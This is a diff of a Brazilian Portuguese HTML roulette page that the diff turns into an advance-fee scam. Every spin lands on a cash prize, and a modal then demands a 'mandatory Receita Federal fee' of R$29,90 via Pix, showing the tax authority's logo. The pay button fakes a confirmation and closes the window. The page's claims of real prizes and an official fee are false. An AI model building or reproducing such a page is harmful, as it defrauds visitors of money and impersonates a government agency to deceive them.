@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Roleta Profissional</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Roleta da Sorte - Estilo idPlugger</title>
   <style>
     :root {
       --size: 360px;
@@ -13,240 +12,281 @@
       --bg: #f4f6f8;
       --muted: #667085;
       --card: #ffffff;
-      --glass: rgba(255,255,255,0.65);
-      --spinner-duration: 5s;
-    }
-
-    * {
-      box-sizing: border-box;
+      --dark: #012340;
     }
 
     body {
-      font-family: Inter, system-ui, Arial, sans-serif;
-      margin: 0;
-      min-height: 100vh;
+      font-family: 'Inter', system-ui, Arial, sans-serif;
+      background: linear-gradient(180deg, #e0f7fa, var(--bg));
       display: flex;
-      align-items: center;
       justify-content: center;
-      background: linear-gradient(180deg, #eef3f8, var(--bg));
-      padding: 28px;
-      color: #071126;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      color: var(--dark);
     }
 
     .card {
-      width: 100%;
-      max-width: 980px;
       background: var(--card);
-      border-radius: 14px;
-      padding: 28px;
-      box-shadow: 0 14px 40px rgba(6,18,40,0.08);
+      border-radius: 20px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+      padding: 30px;
+      max-width: 400px;
+      width: 100%;
       text-align: center;
+      user-select: none;
     }
 
-    header { margin-bottom: 8px; }
     h1 {
-      margin: 0;
-      font-weight: 800;
-      font-size: 20px;
+      font-size: 1.4rem;
+      margin-bottom: 10px;
+      font-weight: 700;
     }
 
     p.lead {
-      margin: 6px 0 18px;
+      font-size: 0.9rem;
       color: var(--muted);
+      margin-bottom: 30px;
     }
 
     .wheel-wrap {
       position: relative;
-      margin: 18px auto 6px;
       width: var(--size);
       height: var(--size);
+      margin: 0 auto 30px;
+      perspective: 1000px;
     }
 
     .wheel {
       width: 100%;
       height: 100%;
       border-radius: 50%;
-      position: relative;
       overflow: hidden;
-      border: 8px solid #fff;
-      box-shadow: 0 10px 30px rgba(6,18,40,0.06);
-      transition: transform var(--spinner-duration) cubic-bezier(.12,.78,.34,1);
-      will-change: transform;
+      border: 10px solid #fff;
+      box-shadow:
+        inset 0 0 10px rgba(0, 0, 0, 0.1),
+        0 4px 20px rgba(0, 0, 0, 0.2);
       background: conic-gradient(
-        #ffd166 0 12.5%, #8ec5ff 12.5% 25%, #98e37b 25% 37.5%, #ff9bd3 37.5% 50%,
-        #ffd166 50% 62.5%, #8ec5ff 62.5% 75%, #98e37b 75% 87.5%, #ff9bd3 87.5% 100%);
+        #ff7f50 0% 25%,
+        #4db6ac 25% 50%,
+        #ffd54f 50% 75%,
+        #ba68c8 75% 100%
+      );
+      transition: transform 5s cubic-bezier(0.33, 0.66, 0.66, 1);
+      transform: rotate(0deg);
+      position: relative;
+    }
+
+    /* Texto dos segmentos */
+    .segment-text {
+      position: absolute;
+      width: 120px;
+      height: 40px;
+      left: 50%;
+      top: 50%;
+      transform-origin: 0% 50%;
+      font-weight: 700;
+      font-size: 1rem;
+      color: #fff;
+      text-shadow: 0 0 3px rgba(0,0,0,0.5);
+      user-select: none;
+    }
+
+    /* Posicionamento das 4 opções iguais à divisão da roleta */
+    .text-0 { transform: rotate(15deg) translate(120px) rotate(-15deg); color: #ff4500; }
+    .text-1 { transform: rotate(105deg) translate(120px) rotate(-105deg); color: #00796b; }
+    .text-2 { transform: rotate(195deg) translate(120px) rotate(-195deg); color: #fbc02d; }
+    .text-3 { transform: rotate(285deg) translate(120px) rotate(-285deg); color: #6a1b9a; }
+
+    .pointer {
+      position: absolute;
+      top: -25px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 0;
+      height: 0;
+      border-left: 20px solid transparent;
+      border-right: 20px solid transparent;
+      border-bottom: 35px solid var(--primary);
+      filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
+      animation: pulse 2s infinite;
+      z-index: 10;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: translateX(-50%) scale(1); }
+      50% { transform: translateX(-50%) scale(1.1); }
     }
 
     .center {
       position: absolute;
-      left: 50%;
       top: 50%;
-      transform: translate(-50%, -50%);
-      width: 120px;
-      height: 120px;
+      left: 50%;
+      width: 140px;
+      height: 140px;
+      background: linear-gradient(180deg, #fff, #f0f0f0);
       border-radius: 50%;
-      background: linear-gradient(180deg, #fff, #fbfbfb);
+      transform: translate(-50%, -50%);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
       display: flex;
-      align-items: center;
       justify-content: center;
-      font-weight: 800;
-      box-shadow: 0 8px 22px rgba(6,18,40,0.06);
+      align-items: center;
+      font-size: 1.3rem;
+      font-weight: 700;
       cursor: pointer;
       user-select: none;
+      transition: background 0.3s;
     }
-
-    .pointer {
-      position: absolute;
-      left: 50%;
-      top: -18px;
-      transform: translateX(-50%);
-      width: 0;
-      height: 0;
-      border-left: 18px solid transparent;
-      border-right: 18px solid transparent;
-      border-bottom: 26px solid var(--primary);
-      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.12));
-    }
-
-    .controls {
-      margin-top: 18px;
+    .center:active {
+      background: #ff4a57;
+      color: #fff;
     }
 
     .btn {
-      display: inline-flex;
-      gap: 10px;
-      align-items: center;
-      padding: 10px 18px;
-      border-radius: 12px;
-      border: 0;
-      background: var(--primary);
-      color: #fff;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 10px 28px rgba(255,90,95,0.12);
+      display: none;
     }
 
-    footer {
-      margin-top: 18px;
-      color: var(--muted);
-      font-size: 13px;
-    }
-
+    /* Modal simples */
     .modal-backdrop {
       position: fixed;
       inset: 0;
+      background: rgba(0,0,0,0.5);
       display: none;
-      align-items: center;
       justify-content: center;
-      background: rgba(3,10,18,0.45);
-      z-index: 60;
+      align-items: center;
+      z-index: 50;
       padding: 20px;
     }
 
     .modal {
       background: var(--card);
-      width: 100%;
-      max-width: 560px;
-      border-radius: 12px;
-      padding: 18px;
+      padding: 24px;
+      border-radius: 16px;
+      max-width: 400px;
       text-align: center;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.25);
     }
 
     .modal h2 {
-      margin: 6px 0 8px;
-    }
-
-    .modal .amount {
-      font-size: 26px;
-      font-weight: 900;
+      margin-bottom: 12px;
+      font-weight: 800;
+      font-size: 1.5rem;
       color: var(--accent);
-      margin-bottom: 6px;
     }
 
-    .modal .small {
-      color: var(--muted);
-      font-size: 13px;
-      margin-bottom: 8px;
+    .modal img {
+      width: 120px;
+      margin: 15px 0;
     }
 
-    .inline-copy {
-      display: flex;
-      gap: 8px;
-      align-items: center;
-      justify-content: center;
-      margin-top: 8px;
-      flex-wrap: wrap;
+    .modal button {
+      margin-top: 20px;
+      background-color: var(--primary);
+      border: none;
+      border-radius: 12px;
+      padding: 12px 28px;
+      color: white;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 1rem;
+      box-shadow: 0 4px 12px rgba(255,90,95,0.3);
+      user-select: none;
+      transition: background 0.3s;
     }
-
-    .chip {
-      background: #f7fafb;
-      border: 1px solid #eef2f6;
-      padding: 8px 10px;
-      border-radius: 10px;
-      font-weight: 600;
-      color: #102a43;
+    .modal button:hover:not(:disabled) {
+      background-color: #e14e4f;
     }
-
-    .actions {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      margin-top: 12px;
-      flex-wrap: wrap;
-    }
-
-    .muted-note {
-      font-size: 13px;
-      color: #8b98a8;
-      margin-top: 8px;
-    }
-
-    @media (max-width: 540px) {
-      :root {
-        --size: 300px;
-      }
-
-      .center {
-        width: 110px;
-        height: 110px;
-      }
+    .modal button:disabled {
+      background-color: #aa3740;
+      cursor: default;
     }
   </style>
 </head>
 <body>
   <div class="card" id="app">
-    <header>
-      <h1>Roleta de Sorteios — Prêmios R$450, R$500, R$700 e R$1.000</h1>
-      <p class="lead">Gire a roleta para ganhar prêmios reais! Após o sorteio, uma taxa de R$29,90 será cobrada para liberar o pagamento do prêmio via Pix.</p>
-    </header>
+    <h1>Roleta de Sorteios — Prêmios R$450, R$500, R$700 e R$1.000</h1>
+    <p class="lead">Gire a roleta para ganhar prêmios reais! Após o sorteio, você será direcionado a uma página para pagar uma taxa obrigatória da Receita Federal de R$29,90 para liberar o pagamento via Pix.</p>
 
-    <main>
-      <div class="wheel-wrap">
-        <div class="pointer"></div>
-        <div class="wheel" id="wheel"></div>
-        <div class="center" id="centerButton">GIRAR</div>
+    <div class="wheel-wrap">
+      <div class="pointer"></div>
+      <div class="wheel" id="wheel">
+        <div class="segment-text text-0">R$450</div>
+        <div class="segment-text text-1">R$500</div>
+        <div class="segment-text text-2">R$700</div>
+        <div class="segment-text text-3">R$1.000</div>
       </div>
+      <div class="center" id="spin">GIRAR</div>
+    </div>
+  </div>
 
-      <div class="controls">
-        <button class="btn" id="spinBtn">Girar</button>
-      </div>
-    </main>
-
-    <footer>
-      <p class="muted-note">Ganhos reais e verídicos. A taxa de R$29,90 será cobrada apenas após o prêmio ser confirmado.</p>
-    </footer>
+  <div class="modal-backdrop" id="modal">
+    <div class="modal">
+      <h2>Parabéns!</h2>
+      <p class="modal-prize" style="font-size:1.8rem; font-weight: 900; color: var(--accent); margin: 10px 0;"></p>
+      <p>Para ativar seu prêmio, será necessário pagar uma taxa obrigatória da <strong>Receita Federal</strong> via Pix de <strong>R$29,90</strong>.</p>
+      <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png/view" alt="Logo Receita Federal" />
+      <button id="pay-button">Pagar R$29,90 e liberar prêmio</button>
+    </div>
   </div>
 
   <script>
-    const spinBtn = document.getElementById('spinBtn');
-    const wheel = document.getElementById('wheel');
-    const centerButton = document.getElementById('centerButton');
+    (function(){
+      const wheel = document.getElementById('wheel');
+      const spinBtn = document.getElementById('spin');
+      const modal = document.getElementById('modal');
+      const modalPrize = modal.querySelector('.modal-prize');
+      const payBtn = document.getElementById('pay-button');
 
-    // Prêmios
-    const premios = [450, 500, 700, 1000];
+      const prizes = ['R$450', 'R$500', 'R$700', 'R$1.000'];
+      const segmentCount = prizes.length;
+      const segmentAngle = 360 / segmentCount;
+      let spinning = false;
+      let currentRotation = 0;
 
-    // Função para girar a roleta
-    const girarRoleta = () => {
-      const valorSorteado = premios[Math.floor(Math.random() * premios.length)];
-      const grau = Math.floor
-    
+      function spinWheel() {
+        if(spinning) return;
+        spinning = true;
+
+        payBtn.disabled = false;
+        payBtn.textContent = 'Pagar R$29,90 e liberar prêmio';
+
+        const prizeIndex = Math.floor(Math.random() * segmentCount);
+
+        const extraSpins = 5;
+        const stopAngle = 360 * extraSpins + (360 - (prizeIndex * segmentAngle)) - (segmentAngle / 2);
+
+        currentRotation = (currentRotation + stopAngle) % 360;
+
+        wheel.style.transition = 'transform 5s cubic-bezier(0.33, 0.66, 0.66, 1)';
+        wheel.style.transform = `rotate(${currentRotation}deg)`;
+
+        setTimeout(() => {
+          spinning = false;
+          modalPrize.textContent = prizes[prizeIndex];
+          modal.style.display = 'flex';
+        }, 5200);
+      }
+
+      function closeSite() {
+        window.close();
+        setTimeout(() => {
+          window.location.href = 'about:blank';
+        }, 1500);
+      }
+
+      spinBtn.addEventListener('click', spinWheel);
+
+      payBtn.addEventListener('click', () => {
+        payBtn.disabled = true;
+        payBtn.textContent = 'Processando pagamento...';
+
+        setTimeout(() => {
+          alert('Pagamento confirmado! Obrigado.');
+          closeSite();
+        }, 2000);
+      });
+    })();
+  </script>
+</body>
+</html>
